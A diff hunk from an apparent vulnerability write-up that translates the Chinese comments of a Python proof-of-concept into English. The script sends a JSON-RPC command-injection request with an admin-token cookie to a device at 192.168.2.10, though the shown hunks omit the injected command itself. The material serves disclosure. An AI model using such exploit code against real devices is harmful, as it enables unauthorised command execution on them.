@@ -27,10 +27,10 @@ Exploit the vulnerability by sending a carefully constructed HTTP request
 ```
 import requests
 
-# 目标URL (注意：URL中的/rpc需要根据实际情况调整)
+# Target URL (Note: the URL needs to be adjusted according to the actual situation)
 url = "http://192.168.2.10/rpc"
 
-# 请求头 (完全匹配Burpsuite中的headers)
+#Request headers (exactly match the headers in burpsuite)
 headers = {
     "Host": "192.168.2.10",
     "Content-Length": "247",
@@ -41,11 +41,11 @@ headers = {
     "Origin": "http://192.168.2.10",
     "Referer": "http://192.168.2.10/",
     "Accept-Encoding": "gzip, deflate, br",
-    "Cookie": "Admin-Token=wb1H7fURGJM4dMpIsTQDZM50GNfgmqGd",
+    "Cookie": "Admin-Token=wb1H7fURGJM4dMpIsTQDZM50GNfgmqGd",#The cookie needs to be modified according to the current admin token
     "Connection": "keep-alive"
 }
+#Request body (json-rpc command injection payload)
 
-# 请求体 (JSON-RPC命令注入payload)
 data = {
     "jsonrpc": "2.0",
     "method": "call",
@@ -65,13 +65,13 @@ data = {
     ]
 }
 
-# 发送POST请求
+#Send post request
 try:
     response = requests.post(
         url,
         headers=headers,
         json=data,
-        verify=False  # 忽略SSL证书验证
+        verify=False 
     )
     
     # 输出响应信息
